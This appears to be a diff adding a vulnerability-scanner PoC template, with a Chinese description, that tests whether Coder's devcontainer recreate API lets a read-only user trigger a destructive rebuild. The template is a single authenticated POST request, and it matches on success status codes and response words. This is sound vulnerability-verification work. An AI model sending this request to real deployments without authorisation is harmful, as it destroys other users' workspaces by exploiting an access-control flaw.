@@ -1,0 +1,45 @@
+[info]
+author = "AVE"
+description = "验证 Coder devcontainer recreate 接口是否存在授权绕过，低权限用户（仅 ActionRead）能否触发破坏性重建操作"
+id = "POC-AVE-2026-0607"
+name = "Coder Devcontainer 重建接口授权绕过 PoC"
+severity = "medium"
+tags = ["ave-2026-0607"]
+vuln_id = [
+    "CVE-2026-55433",
+    "AVE-2026-0607",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v2/workspaces/{{workspace}}/devcontainers/recreate"
+protocol = "http"
+
+[poc.requests.body]
+content = "{}"
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "recreating",
+    "rebuild",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    202,
+]
+type = "status"
